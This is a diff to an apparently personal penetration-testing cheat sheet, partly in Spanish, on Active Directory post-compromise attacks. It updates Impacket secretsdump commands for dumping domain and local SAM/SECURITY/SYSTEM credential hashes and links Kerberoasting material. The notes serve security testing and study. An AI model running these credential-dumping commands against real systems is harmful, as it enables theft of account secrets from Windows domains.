@@ -45,7 +45,9 @@
 
 ### Post compromise attacks
 - [kali impacket - secrets dump](https://www.kali.org/tools/impacket/)
-    - `secretsdump.py DC.LOCAL/USER:'PASSWORD'@$IP` 
+    - `impacket-secretsdump DC.LOCAL/USER:'PASSWORD'@$IP`
+    - running secretsdump as local:
+        - `impacket-secrestsdump -sam sam.save -security security.save -system system.save LOCAL`
 - [Kerberoasting](https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast)
     - [más material](https://tools.thehacker.recipes/impacket/examples/getuserspns.py)
     - Cuando comprometemos una cuenta, un ataque para empezar es este.
